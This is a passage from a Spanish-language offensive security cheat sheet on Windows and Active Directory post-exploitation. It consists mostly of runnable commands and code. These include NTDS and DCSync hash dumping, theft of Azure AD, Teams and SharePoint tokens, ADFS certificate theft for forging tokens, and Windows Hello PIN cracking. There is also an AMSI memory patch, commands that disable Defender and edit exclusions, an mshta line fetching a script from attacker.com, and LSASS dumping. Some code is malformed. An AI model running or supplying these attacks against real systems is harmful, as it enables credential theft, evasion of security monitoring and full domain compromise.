# Método 4: ntdsdotsql (SQL queries contra NTDS)
git clone https://github.com/zcgonvh/ntdsdotsql
python3 ntdsdotsql.py -f ntds.dit -o output.txt

# Método 5: Usar vssadmin nativo
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
vssadmin delete shadows /for=C: /quiet
```

### 32.2 Secretsdump con DRSUAPI (DCSync Style)

```bash
# DCSync usando el protocolo DRSUAPI (Directory Replication Service API)
# Simula ser otro DC

# Con impacket (full dump)
impacket-secretsdump -just-dc dominio.com/admin:Pass123@192.168.1.100

# Solo usuarios específicos
impacket-secretsdump -just-dc-user Administrador dominio.com/admin:Pass123@192.168.1.100
impacket-secretsdump -just-dc-user krbtgt dominio.com/admin:Pass123@192.168.1.100

# Solo NTLM hashes
impacket-secretsdump -just-dc-ntlm dominio.com/admin:Pass123@192.168.1.100

# Con output file
impacket-secretsdump -just-dc -outputfile dominio_hashes dominio.com/admin:Pass123@192.168.1.100

# DCSync con pass-the-hash
impacket-secretsdump -hashes :NTLMHASH dominio.com/admin@192.168.1.100

# DCSync minimal (solo lo necesario)
impacket-secretsdump -just-dc -user-status dominio.com/admin:Pass123@192.168.1.100

# Con crackmapexec
crackmapexec [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) 192.168.1.100 -u admin -p Pass123 --ntds

# DCSync vía Mimikatz
mimikatz # lsadump::[dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) /domain:dominio.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:dominio.com /user:Administrador
mimikatz # lsadump::dcsync /domain:dominio.com /all /csv
```

### 32.3 USN Journal Parsing (Update Sequence Number)

```cmd
# USN Journal registra cambios en archivos del sistema NTFS
# Puede revelar cambios en archivos de AD

# Ver USN Journal
fsutil usn queryjournal C:
fsutil usn readjournal C: > usn_journal.txt

# Buscar cambios en ntds.dit
findstr "ntds.dit" usn_journal.txt

# Con PowerShell
powershell "Get-FileIntegrity -Path C:\Windows\NTDS\ntds.dit"

# Herramienta: USN-Journal-Parser
git clone https://github.com/PoorBillionaire/USN-Journal-Parser
python3 usn_parser.py -f usn_journal.txt -o parsed.txt
```

### 32.4 AD Recycle Bin Enumeration

```cmd
# El Recycle Bin de AD guarda objetos eliminados por ~180 días
# Incluye usuarios, computadoras, grupos

# Ver objetos eliminados
powershell "Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *"

# Listar usuarios eliminados (útiles si querés restaurar cuentas legacy)
powershell "Get-ADObject -Filter {ObjectClass -eq 'user' -and isDeleted -eq $true} -IncludeDeletedObjects -Properties samAccountName,userPrincipalName,msDS-DeletedObjectLifetime"

# Restaurar objeto eliminado
powershell "Restore-ADObject -Identity 'DN_DEL_OBJETO'"

# Buscar objetos eliminados con SIDHistory
powershell "Get-ADObject -Filter {isDeleted -eq $true -and sidHistory -like '*'} -IncludeDeletedObjects -Properties sidHistory"
```

---

## 33. Microsoft Entra ID (Azure AD) Attacks

### 33.1 Token Theft — Azure AD Access & Refresh Tokens

```cmd
# Los tokens de Azure AD se almacenan en:
# - WAM (Web Account Manager) - Windows 10/11
# - PRT (Primary Refresh Token) - en el dispositivo
# - Cookies de navegador
# - Token Cache de aplicaciones

# Extraer tokens con MSAL (Microsoft Authentication Library)
# Usar TokenTactics:
git clone https://github.com/rvrsh3ll/TokenTactics
cd TokenTactics
Import-Module .\TokenTactics.ps1

# Extraer tokens de la sesión actual
Get-MsalToken -ClientId d3590ed6-52b3-4102-aeff-aad2292ab01c
# Client ID típico: Azure PowerShell, Azure CLI, etc.

# Usar refresh token para generar access tokens
Get-MsalToken -ClientId d3590ed6-52b3-4102-aeff-aad2292ab01c -RefreshToken "REFRESH_TOKEN"

# Extraer PRT (Primary Refresh Token)
# El PRT permite generar tokens para cualquier recurso
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::cloudapkd

# Con ROADtools (Route One AD)
git clone https://github.com/dirkjanm/ROADtools
cd ROADtools
pip install -r requirements.txt
roadrecon auth -t PRT_SESSION_KEY -p PRT
roadrecon gather -c tokens.txt
```

### 33.2 PRT (Primary Refresh Token) Abuse

```cmd
# El PRT es el token maestro de Azure AD en un dispositivo
# Permite generar tokens de acceso para cualquier recurso cloud

# Extraer PRT
# 1. Localizar clave PRT en el dispositivo
dir C:\Users\%username%\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\LocalState\

# 2. Extraer con herramienta PRT-extractor
Invoke-PRTExtractor -Path "C:\Users\user\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\LocalState\tokens.dat"

# Usar PRT para generar session key
python3 PRTToAccessToken.py --prt PRT_VALUE --sessionkey SESSION_KEY --resource "https://graph.microsoft.com"

# Después del PRT, podés acceder a:
# - Microsoft Graph
# - Azure Management
# - Office 365
# - SharePoint Online
# - Exchange Online

# Simular autenticación de dispositivo con PRT
roadrecon auth --prt-initial PRT --prt-sessionkey SESSIONKEY
roadrecon gather --tokens roadrecon_tokens.json
```

### 33.3 Seamless SSO Exploitation

```cmd
# Seamless SSO permite login automático desde el dominio al cloud
# Usa el TGT de Kerberos para obtener token de Azure AD

# Extraer TGT de un usuario
mimikatz # sekurlsa::tickets /export

// Usar TGT como Seamless [sso](../raw/hybr1d-1d3nt1ty.md#sso) para [azure ad](../raw/hybr1d-1d3nt1ty.md)
# Si Windows se autentica automáticamente a Azure AD via Seamless SSO,
# podés capturar ese token:

# 1. Capturar la autenticación Seamless SSO
# Con Responder:
[responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) -I eth0

# 2. O usar un proxy para capturar el token:
# Configurar proxy inverso que capture headers de autenticación

# 3. El token de Seamless SSO está en el header HTTP
# Authorization: Bearer token...
# Podés extraerlo del tráfico de red
```

### 33.4 Password Hash Sync (PHS) Extraction

```cmd
# Password Hash Sync sincroniza hashes NTLM del AD on-prem al cloud
# Si comprometés el Azure AD Connect server, tenés acceso a todos los hashes

# El server Azure AD Connect tiene:
# - Una base de datos local con hashes sincronizados
# - Permisos de replicación en el AD on-prem
# - Credenciales de la cuenta de sincronización

# Buscar el server AAD Connect
# Normalmente es un servidor específico
nslookup -type=srv _adfs._tcp.dominio.com

# Extraer la DB de sincronización
# La DB está en:
dir "C:\Program Files\Microsoft [azure ad](../raw/hybr1d-1d3nt1ty.md) Sync\Data\"
# Archivo: ADSync.mdf (SQL Server Express)

# Extraer hashes y credenciales
# Herramienta: AADInternals
Import-Module .\AADInternals.ps1
Get-AADIntSyncCredentials -Server localhost

# O con SQL query directamente:
sqlcmd -S .\ADSync -d ADSync -Q "SELECT * FROM mms_management_agent"

# Extraer la cuenta de sincronización
Get-AADIntConnectorAccount -Server localhost
# Esta cuenta tiene permisos de replicación en todo el dominio
```

### 33.5 ADFS Token Signing Certificate Theft

```cmd
# El certificado de firma de tokens de ADFS permite forjar tokens
# para cualquier usuario contra Azure AD / Office 365

# El cert está en el ADFS server en:
# Almacén de certificados del equipo → ADFS → Tokens Signing

# Extraer con Mimikatz
mimikatz # crypto::certificates /export /systemstore:ADFS
# Buscar el que dice "Token Signing"

# O con herramientas ADFSDump:
git clone https://github.com/nccgroup/ADFSDump
# Copiar a máquina Windows con ADFS
ADFSDump.exe > token_signing_cert.txt

# Extraer clave privada
# Buscar el contenedor:
dir "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\"

# Con la clave privada, forjar tokens
# Usar AADInternals:
New-AADIntAccessTokenForADFS -TokenCertificate "C:\temp\token_signing.pfx" -UserPrincipalName admin@dominio.com

# Verificar token forjado
Get-AADIntAccessToken -AccessToken TOKEN | fl
```

### 33.6 Cloud Kerberos Trust Abuse

```cmd
# Cloud Kerberos Trust permite autenticación Kerberosa desde Azure AD
# hacia recursos on-premises

# Extraer clave del trust
# La clave está en el Azure AD Connect server
# o en el DC que tiene el trust

# Encontrar el trust
powershell "Get-ADTrust -Filter * | Where-Object {$_.Target -like '*[azure](../raw/cl0ud-h4ck1ng.md#azure)*'}"

# Listar propiedades del trust de Azure
nltest /domain_trusts | findstr "AzureAD"

# Con el trust compromise, podés:
# - Forjar tickets para recursos on-prem
# - Usar Silver Ticket contra recursos híbridos
```

---

## 34. Windows Hello for Business Attacks

### 34.1 PIN Cracking (NGC Key Cracking)

```cmd
# Windows Hello PIN está protegido por TPM + NGC
# El hash del PIN se puede extraer del TPM

# Localizar NGC keys
dir C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc

# Extraer PIN hash
# Se necesita acceso SYSTEM + al TPM
# Herramienta: ngcrack

ngcrack --extract-only --output ngc_hashes.txt

# El PIN puede ser de 4 a 8 dígitos
# Fuerza bruta:
for pin in $(seq -w 0000 9999); do
    ngcrack --pin $pin --hashes ngc_hashes.txt && echo "PIN: $pin" && break
done

# Crackear con hashcat (modo 26500)
[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) -m 26500 ngc_hash.txt -a 3 ?d?d?d?d  # 4 digit PIN
hashcat -m 26500 ngc_hash.txt -a 3 ?d?d?d?d?d?d  # 6 digit PIN
hashcat -m 26500 ngc_hash.txt -a 3 ?d?d?d?d?d?d?d?d  # 8 digit PIN
```

### 34.2 TPM Key Extraction

```cmd
# Las claves del TPM protegen el PIN de Windows Hello
# Si podés acceder al TPM, podés extraer las claves

# El TPM se maneja a través de:
# - TBS (TPM Base Services)
# - Windows TPM API

# Listar claves del TPM
powershell "Get-TpmEndorsementKeyInfo -HashAlgorithm sha256"
powershell "Get-WmiObject -Namespace root\CIMv2\Security\MicrosoftTpm -Class Win32_Tpm"

# Extraer claves del TPM (necesita acceso físico o SYSTEM)
# Herramienta: TPMGenKeyDump
TPMGenKeyDump.exe

# Leer la memoria del TPM via /dev/tpm0 (Linux)
cat /sys/class/tpm/tpm0/device/description

# Si el TPM está en modo "tpmclear" o no está bloqueado
tpmtool clear -force
# Después Windows Hello queda deshabilitado y las claves expuestas

# Usar MkeyReader para volcar hashes de PIN
MkeyReader.exe
```

### 34.3 NGC Key Abuse

```cmd
# NGC (Next Generation Credential) maneja Windows Hello
# Las claves NGC pueden transferirse a otro dispositivo

# Las NGC keys están en:
dir "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\"

# Cada key tiene:
# - Private key (protegida por TPM + PIN)
# - Public key (compartida con Azure AD / AD on-prem)
# - Certificados asociados

# Si transferís la NGC key a otra máquina y conocés el PIN,
# podés autenticarte como el usuario original

# Exportar NGC container completo
ssh USER@TARGET "tar czf ngc.tar.gz C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\"
# Después importar en otra máquina
tar xzf ngc.tar.gz -C "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\"

# Con el NGC key importado + PIN conocido, loguearse como el usuario
# Esto funciona para Azure AD join
```

---

## 35. Microsoft 365 Attacks

### 35.1 Exchange Online Token Theft

```cmd
# Los tokens de Exchange Online se pueden extraer de:
# - Outlook client cache
# - Cookies de navegador
# - Token cache de Office

# Extraer tokens de Outlook
# Caché de Outlook en:
dir %LOCALAPPDATA%\Microsoft\Outlook\*
# Archivo: .ost (Offline Storage Table)

# Extraer credenciales guardadas en Outlook
# Con MailSniper:
git clone https://github.com/dafthack/MailSniper
Import-Module .\MailSniper.ps1

# Extraer tokens Exchange Online
Get-ExchangeWebToken -Mailbox admin@dominio.com -Server outlook.office365.com | fl

# Usar token para acceder al buzón vía EWS
Invoke-ParseExchangeWebToken -Token "TOKEN_AQUI"

# Extraer credenciales guardadas de perfiles de Outlook
dir "HKCU:\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\"
# Buscar "00000001" con los datos de la cuenta

# Buscar tokens en procesos de Office
# ProcDump + extraer tokens:
procdump64.exe -ma OUTLOOK.EXE outlook.dmp
strings outlook.dmp | grep -i "bearer" | head -5
```

### 35.2 SharePoint Online Token Theft

```cmd
# Tokens de SharePoint se guardan en cookies de navegador
# y en el cache de Office

# Extraer cookies de SharePoint de Chrome
# Chrome guarda cookies en:
dir %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies

# Extraer con SQLite
sqlite3 Cookies "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%sharepoint%';"

# Usar token robado para acceder a SharePoint
# PowerShell:
$token = "TOKEN_AQUI"
$headers = @{Authorization = "Bearer $token"}
Invoke-RestMethod -Uri "https://dominio.sharepoint.com/_api/web/" -Headers $headers

# Extraer tokens de OneDrive synced
dir %LOCALAPPDATA%\Microsoft\OneDrive\settings\Business1\ClientPolicy*.json
# Los tokens están en formato JSON
```

### 35.3 Teams Token Theft

```cmd
# Los tokens de Teams se almacenan en el caché de la app
# Teams es básicamente una app Electron que guarda tokens en disco

# Cache de Teams:
dir %APPDATA%\Microsoft\Teams\Cookies
dir %APPDATA%\Microsoft\Teams\Local Storage\leveldb
dir %APPDATA%\Microsoft\Teams\IndexedDB

# Extraer tokens de Teams de LevelDB
strings %APPDATA%\Microsoft\Teams\Local Storage\leveldb\*.log | grep -i "token"
strings %APPDATA%\Microsoft\Teams\Local Storage\leveldb\*.ldb | grep -i "access_token"

# Extraer cookies de Teams
type %APPDATA%\Microsoft\Teams\Cookies | findstr "token"

# Con el token de Teams, acceder a:
# - Chat history
# - Teams channels
# - Calendar
# - Files compartidos

# Usar token robado
$token = "TOKEN_AQUI"
$headers = @{Authorization = "Bearer $token"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/chats" -Headers $headers

# Teams token via Graph API
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
```

### 35.4 OneDrive Data Exfiltration

```cmd
# Una vez comprometido el token, extraer datos de OneDrive

# Con token de acceso:
$token = "TOKEN_AQUI"
$headers = @{Authorization = "Bearer $token"}

# Listar archivos de OneDrive
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" -Headers $headers

# Descargar archivo específico
$item = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root:/secretos.xlsx" -Headers $headers
Invoke-RestMethod -Uri $item.'@microsoft.graph.downloadUrl' -OutFile secretos.xlsx

# Descargar todo OneDrive
Get-ChildItem -Path "C:\Users\%username%\OneDrive\" -Recurse | Copy-Item -Destination "C:\Temp\exfil\"

# OneDrive sync client también cachea archivos locales
dir "C:\Users\%username%\OneDrive\*"
# Los archivos están disponibles aunque estén "online-only" si configuraste
```

---

## 36. BloodHound Advanced — Queries y Automatización

### 36.1 Custom Cypher Queries

```cypher
// Encontrar todos los usuarios con DCSync rights
MATCH (n:User) WHERE n.AdminCount OR n.HasSIDHistory OR n.HighValue
MATCH p = (n)-[:MemberOf*1..]->(g:Group)
WHERE g.name = 'DOMAIN ADMINS@DOMINIO.COM'
RETURN p

// Encontrar computadoras sin SMB signing
MATCH (c:Computer) WHERE c.smbsigning = false RETURN c.name, c.operatingsystem

// Encontrar usuarios con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de GenericAll sobre otras cuentas
MATCH p = (n:User)-[r:GenericAll]->(m:User) WHERE n <> m RETURN p

// Encontrar rutas de [gpo](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy) abuse
MATCH p = (g:GPO)-[:GpLink*1..]->(ou:OU)<-[:Contains*1..]-(c:Computer)
MATCH (u:User)-[:GenericWrite]->(g)
RETURN u.name, g.name, c.name

// Encontrar usuarios con SPN para Kerberoast
MATCH (u:User) WHERE u.hasspn = true RETURN u.name, u.serviceprincipalnames

// Encontrar usuarios sin preauth (AS-REP Roast)
MATCH (u:User) WHERE u.dontreqpreauth = true RETURN u.name

// Encontrar administradores locales en computadoras
MATCH (c:Computer) MATCH (u:User) WHERE (u)-[:AdminTo]->(c) RETURN u.name, c.name

// Encontrar todos los grupos con miembros extranjeros (trusts)
MATCH (g:Group) WHERE g.domain <> 'DOMINIO.COM'
WITH g MATCH (m:Member)-[:MemberOf]->(g) RETURN m.name, g.name, g.domain

// Buscar ACLs abusables
MATCH p = (n)-[r:GenericAll|WriteOwner|WriteDacl|GenericWrite|Owns]->(m)
RETURN n.name, type(r), m.name

// Encontrar users con sesión activa en computadoras
MATCH (u:User)-[:HasSession]->(c:Computer) RETURN u.name, c.name
```

### 36.2 BloodHound CE New Features

```cmd
# BloodHound CE es la versión nueva con mejor escalabilidad
# Reemplaza neo4j + bloodhound por un stack más moderno

# Instalar BloodHound CE con Docker
[docker](../raw/d0ck3r-f0r-h4ck3rs.md) run -d --name [bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound)-ce \
  -p 8080:8080 \
  -e BLOODHOUND_FORCE_CHECK_UPDATE=false \
  ghcr.io/specterops/bloodhound-ce

# Acceder a:
# http://localhost:8080
# Usuario: admin
# Password: generada en el log

# Características nuevas:
# - UI web (no más Java desktop app)
# - Mejores visualizaciones 3D
# - Cypher query editor integrado
# - Saved queries
# - Búsqueda más rápida
# - Soporte para graphs enormes (100k+ nodos)

# SharpHound v2.0 (nuevo collector)
[sharphound](../raw/w1nd0ws-p0st3xpl01t.md#sharphound).exe -c All --zipfilename colection --jitter 30

# Mejores opciones de SharpHound CE:
SharpHound.exe -c All,DCOnly --domain dominio.com
SharpHound.exe -c All,GPOLocalGroup,SessionLoop --domain dominio.com --throttle 10000 --jitter 60

# Colectar solo objetos de confianza
SharpHound.exe -c DCRegistry,[container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) --domain dominio.com
```

### 36.3 Custom BloodHound Collectors

```cmd
# SharpHound custom loops for session collection
# Session collection loop (cada 30 segundos por 10 minutos)
SharpHound.exe -c SessionLoop --loopduration 00:10:00 --loopinterval 00:00:30

# Azure collector (BloodHound CE soporta Azure)
# Usar AzureHound para recolectar objetos de Azure
Import-Module .\AzureHound.ps1
Invoke-AzureHound -TenantID "tenant-id" -OutputPrefix "azure_data"

# AzureHound collection
$tenant = "dominio.onmicrosoft.com"
$clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$secret = "client-secret"

Invoke-AzureHound -TenantID $tenant -ClientID $clientId -ClientSecret $secret -OutputPrefix "azure-export"

# Después de colectar, importar a BloodHound CE
# AzureHound exporta JSON que BloodHound CE reconoce
```

### 36.4 BloodHound Automation with Python

```python
#!/usr/bin/env python3
# pybloodhound - automating BloodHound analysis

from neo4j import GraphDatabase
import json

class BloodHoundAuto:
    def __init__(self, uri="bolt://localhost:7687", user="neo4j", password="bloodhound"):
        self.[driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) = GraphDatabase.[driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers)(uri, auth=(user, password))

    def run_query(self, query):
        with self.driver.session() as session:
            result = session.run(query)
            return [record.data() for record in result]

    def find_domain_admins(self):
        query = """
        MATCH (g:Group) WHERE g.name =~ '(?i).*DOMAIN ADMINS.*'
        MATCH (m)-[:MemberOf]->(g)
        RETURN m.name as member, m.samaccountname as sam
        """
        return self.run_query(query)

    def find_kerberoastable(self):
        query = """
        MATCH (u:User) WHERE u.hasspn = true
        RETURN u.name, u.samaccountname, u.serviceprincipalnames
        """
        return self.run_query(query)

    def find_asrep_roastable(self):
        query = """
        MATCH (u:User) WHERE u.dontreqpreauth = true
        RETURN u.name, u.samaccountname
        """
        return self.run_query(query)

    def find_path_to_da(self, start_user):
        query = f"""
        MATCH (start:User {{samaccountname: '{start_user}'}})
        MATCH (da:Group) WHERE da.name =~ '(?i).*DOMAIN ADMINS.*'
        MATCH p = shortestPath((start)-[:MemberOf|AdminTo|HasSession|AllowedToDelegate|AddMember|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..8]->(da))
        RETURN p
        """
        return self.run_query(query)

    def find_sessions(self):
        query = """
        MATCH (u:User)-[:HasSession]->(c:Computer)
        RETURN u.name as user, c.name as computer
        ORDER BY u.name
        """
        return self.run_query(query)

    def high_value_targets(self):
        query = """
        MATCH (n) WHERE n.highvalue = true
        RETURN labels(n) as type, n.name as name, n.highvaluereasons
        """
        return self.run_query(query)

    def report(self):
        print("[*] Domain Admins:")
        for da in self.find_domain_admins():
            print(f"  - {da['member']}")

        print("\n[*] Kerberoastable Users:")
        for k in self.find_kerberoastable():
            print(f"  - {k['name']}")

        print("\n[*] AS-REP Roastable Users:")
        for a in self.find_asrep_roastable():
            print(f"  - {a['name']}")

        print("\n[*] Active Sessions:")
        for s in self.find_sessions():
            print(f"  - {s['user']} -> {s['computer']}")

        print("\n[*] High Value Targets:")
        for h in self.high_value_targets():
            print(f"  - {h['type']}: {h['name']} (Razón: {h['highvaluereasons']})")

if __name__ == '__main__':
    bh = BloodHoundAuto()
    bh.report()
```

---

## 37. Defender for Endpoint Evasion (Completo)

### 37.1 AMSI Bypass Avanzados

```powershell
# AMSI tiene firmas para detectar técnicas conocidas de bypass
# Estos son bypasses que funcionan con Defender actualizado

# Bypass 1: HWBP (Hardware Breakpoint) - más sigiloso
# Parchear AmsiScanBuffer via hardware breakpoint
$Win32 = Add-Type -memberDefinition @"
DllImport("[[kernel32](../raw/w1n-1nt3rn4ls.md#kernel32)")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("[amsi](../raw/3dr-3v4s10n.md#amsi).dll"), "AmsiScanBuffer")
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$out = 0
$Win32::VirtualProtect($ptr, [UIntPtr]::new(6), 0x40, [ref]$out)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)

# Bypass 2: Fork and suspend (crear proceso, parchar memoria)
$procs = Start-Process -WindowStyle Hidden -PassThru -FilePath powershell.exe -ArgumentList "-nop -w hidden"
$id = $procs.Id
$handle = (Get-Process -Id $id).Handle
# Inyectar código en el proceso hijo
# El hijo ejecuta mientras el padre lo controla

# Bypass 3: DLL sideloading de amsi.dll falsa
# Si podés escribir en el directorio de la app antes de que cargue AMSI
copy evil_amsi.dll C:\Program Files\VulnerableApp\amsi.dll
# Cuando la app carga AMSI, carga nuestra DLL falsa que no escanea

# Bypass 4: Usar CLR hosting
# Crear runtime CLR directamente desde código C++
# AMSI no se inyecta automáticamente en CLR hosts custom
```

### 37.2 Defender Evasion — Exclusiones y Deshabilitación

```cmd
# Agregar exclusiones via registry (sin PowerShell)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Temp" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v ".ps1" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "powershell.exe" /t REG_DWORD /d 0 /f

# Usar MpCmdRun para exclusiones (si tenés acceso)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -AddExclusion -ExclusionPath C:\Temp

# Deshabilitar temporalmente via MpCmdRun
"C:\Program Files\Windows Defender\MpCmdRun.exe" -DisableRealtimeMonitoring

# Deshabilitar Sample Submission
powershell Set-MpPreference -SubmitSamplesConsent 2
# 2 = Never send

# Deshabilitar Cloud Protection
powershell Set-MpPreference -MAPSReporting 0
powershell Set-MpPreference -CloudBlockLevel 0
powershell Set-MpPreference -CloudTimeout 1

# Deshabilitar PUA Protection
powershell Set-MpPreference -PUAProtection 0

# Parar servicio Defender
sc stop WinDefend
sc config WinDefend start=disabled
```

### 37.3 ASR Rule Bypass (Attack Surface Reduction)

```cmd
# ASR (Attack Surface Reduction) bloquea comportamientos comunes de malware
# Listar reglas activas:
powershell "Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids"
powershell "Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions"

# Bypass de ASR para:
# - Office macro blocking (Rule: 3b576869-a4ec-4529-8536-b80a7769e899)
# - Script obfuscation (Rule: 5beb7efe-fd9a-4556-801d-275e5ffc04cc)
# - Process injection (Rule: 9b6a6068-0c5a-4b4e-a4c4-0b1c0d8a2e4d)

# Bypass: Firmar tu binario con un cert confiable
# Usar certificado de editor (si encontrás uno robado)
signtool sign /fd SHA256 /a /f stolen_cert.pfx /p password evil.exe

# Bypass: Usar binarios LOLBins (Living Off the Land)
# ASR permite ejecución de binarios firmados por Microsoft
# Ejecutar código powershell via:
mshta.exe javascript:a=GetObject("script:http://attacker.com/evil.sct").Exec();close();

# Bypass: Modificar reglas ASR via registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender [exploit](../raw/m3t4spl01t.md#exploits) Guard\ASR\Rules" /v "3b576869-a4ec-4529-8536-b80a7769e899" /t REG_DWORD /d 0 /f
```

### 37.4 Microsoft 365 Defender Evasion

```cmd
# Microsoft 365 Defender (antes ATP) agrega capa cloud de detección
# Evasión:
# 1. Usar tráfico cifrado (HTTPS) para C2
# 2. No usar dominios conocidos de malware
# 3. Rotar IPs de C2 frecuentemente

# Evasión de detección de comportamiento en endpoints:
# - No hacer nada sospechoso inmediatamente después de compromiso
# - Esperar horas/días antes de movimientos laterales
# - Mimicar tráfico normal
# - Usar herramientas administrativas legítimas (PowerShell, WMI, PSExec)

# Evasión de detección de tráfico de red:
# - Usar C2 sobre servicios legítimos (Dropbox, Google Drive, OneDrive)
# - Domain fronting (Azure CDN, Cloudflare, AWS CloudFront)
# - Eventuales conexiones (dormir entre C2 beacons)

# Bypass de SmartScreen
# SmartScreen bloquea descargas de binarios no confiables
# Bypass:
# 1. Comprimir en .7z (SmartScreen no escanea 7z)
# 2. Usar zonas alternativas (Alternate Data Streams)
# 3. Firmar con certificado
# 4. Descargar como .txt y renombrar

# Bypass de Windows Defender Application Guard (WDAG)
# WDAG abre archivos no confiables en contenedor Hyper-V
# Bypass: no se puede, mejor no usar formatos que disparen WDAG
```

### 37.5 VBS (Virtualization-Based Security) Bypass

```cmd
# VBS (Virtualization-Based Security) aísla procesos críticos
# Incluye Credential Guard, Device Guard, HVCI

# VBS no se puede bypassear fácilmente porque corre en modo VTL1 (hypervisor)
# Pero podemos verificar si está habilitado:
powershell "Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
msinfo32.exe | findstr "Virtualization-based security"

# Si VBS está habilitado:
# - Credential Guard: no se pueden extraer hashes con Mimikatz (sekurlsa::logonpasswords falla)
# - HVCI: no se pueden cargar drivers no firmados
# - Device Guard: solo ejecuta apps firmadas

# Bypass parcial de Credential Guard:
# En vez de sekurlsa::logonpasswords, usar:
# - DCSync (si tenés permisos de replicación)
# - LSASS dump + extraer offline
# - Kerberos tickets (no protegidos por Credential Guard)

# LSASS dump a pesar de Credential Guard
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# Después del dump, los hashes están protegidos pero los tickets de Kerberos no
# Podés extraer tickets:
mimikatz # sekurlsa::tickets /export
# Los tickets TGS contienen el hash NTLM del usuario en su forma cifrada
# Con suficiente potencia, podés crackearlo

# Otra opción: WDigest (si está habilitado)
# WDigest almacena contraseñas en plaintext
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Logout + login del usuario, después Mimikatz extrae las passwords
```

### 37.6 HVCI (Hypervisor-Protected Code Integrity) Bypass

```cmd
# HVCI impide cargar drivers no firmados
# Esto rompe varios exploits de kernel

# Verificar estado:
powershell "Get-DeviceGuardInfo"

# Si HVCI está habilitado:
# - No se pueden cargar drivers de kernel
# - No funciona kernel exploits clásicos
# - No funciona Mimikatz driver

# Alternativas sin kernel:
# - Usar RPC, WMI, COM para escalada
# - Abusar de servicios corriendo como SYSTEM
# - Token manipulation desde userland
```

### 37.7 Secure Launch / System Guard

```cmd
# Secure Launch (Measured Boot) verifica integridad del boot
# System Guard protege contra rootkits en el boot

# Evasión: no se puede bypassear desde el SO
# Hay que atacar el firmware (UEFI)
# O usar ataques pre-boot (no aplican a post-explotación)

# Pero podés verificar si está habilitado:
powershell "Get-CimInstance -ClassName Win32_ComputerSystem -Namespace root\CIMV2 | Select-Object -Property Manufacturer,Model,TotalPhysicalMemory,BootupState"
msinfo32.exe | findstr "System Guard"
```

---

## 38. GUI Automation para Escalada de Privilegios (UIAccess Bypass)

### 38.1 UIAccess (UI Access) Bypass

```cmd
# UIAccess (antes UI Automation) permite que aplicaciones elevadas
# interactúen con la UI del usuario logueado
# Esto se usa para escalar privilegios ejecutando comandos en contexto SYSTEM

# Verificar si el usuario tiene UIAccess habilitado
whoami /priv | findstr "UIAccess"

# Si tenés UIAccess, podés elevar a SYSTEM interactuando con procesos del sistema
# Crear proceso en session 0 (servicios) que interactúe con la UI
schtasks /create /tn "EvilTaskGui" /tr "C:\Windows\System32\cmd.exe /c whoami > C:\Temp\output.txt" /sc onstart /ru SYSTEM
schtasks /run /tn "EvilTaskGui"

# UIAccess via winlogon.exe impersonation
# Si tenés SeTcbPrivilege, podés crear un token de SYSTEM
# y usarlo para interactuar con la GUI
```

### 38.2 Interactive Window Station Attacks

```cmd
# Windows tiene "Window Stations" que aíslan la GUI entre sesiones
# Session 0 (servicios) está aislada de Session 1+ (usuarios)

# Pero si tenés acceso a la estación de ventanas de otro usuario:
# Podés:
# - Injectar keystrokes
# - Capturar pantallas
# - Leer ventanas

# Herramienta: Invoke-TokenManipulation para duplicar token de winlogon
